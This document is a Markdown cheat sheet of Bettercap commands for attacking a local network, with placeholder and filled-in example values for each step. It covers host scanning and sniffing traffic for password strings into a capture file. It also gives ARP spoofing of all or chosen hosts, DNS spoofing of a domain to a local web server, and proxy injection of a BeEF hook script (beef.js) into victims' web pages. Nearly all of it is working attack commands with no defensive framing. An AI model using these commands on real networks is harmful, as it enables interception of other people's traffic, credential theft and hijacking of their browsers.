# Bettercap

## GUI

Install GUI:

	sudo bettercap -eval "caplets.update; ui.update; q"

Execute:

	sudo bettercap -caplet http-ui -gateway-override %Variable%Gateway% -iface %Variable%Interface%

	sudo bettercap -caplet http-ui 192.168.0.1 -iface en0

## Mac OS

Open bettercap: (configure the gateway and the interface for Mac OS)

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface%

	sudo bettercap -gateway-override 192.168.0.1 -iface en0

## Scan networks

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface% -eval 'net.recon on;net.probe on;clear;ticker on;'

	sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'net.recon on;net.probe on;clear;ticker on;'

## Active sniffing (interactive)

	set net.sniff.regexp %Variable%RegEx%;

	set net.sniff.regexp .*password=.+;

	set net.sniff.output passwords.pcap;
	net.sniff on;

## ARP spoofing

Spoof all the hosts: (be careful on big network)

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface% -eval 'set arp.spoof.fullduplex true;arp.spoof on;'

	sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;arp.spoof on;'

Spoof a specific host:

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface% -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets %Variable%RHOST%;arp.spoof on;'

	sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;'

## DNS Spoofing

Spoof all the hosts: (be careful on big network)

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface% -eval 'set arp.spoof.fullduplex true;arp.spoof on;set dns.spoof.domains %Variable%Domain%;set dns.spoof.all true;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'

	sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;arp.spoof on;set dns.spoof.domains apache.com;set dns.spoof.all true;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'

Spoof a specific host:

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface% -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets %Variable%RHOST%;arp.spoof on;set dns.spoof.domains %Variable%Domain%;set dns.spoof.address %Variable%LHOST%;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'

	sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;set dns.spoof.domains apache.com;set dns.spoof.address 192.168.0.116;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'

## Script injection

	sudo bettercap -gateway-override %Variable%Gateway% -iface %Variable%Interface% -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets %Variable%RHOST%;arp.spoof on;set http.proxy.script /Library/WebServer/Documents/bettercap/%Variable%Script%;set http.proxy.blacklist *;set http.proxy.whitelist %Variable%Domain%;http.proxy on'

	sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;set http.proxy.script /Library/WebServer/Documents/bettercap/beef.js;set http.proxy.blacklist *;set http.proxy.whitelist apache.com;http.proxy on'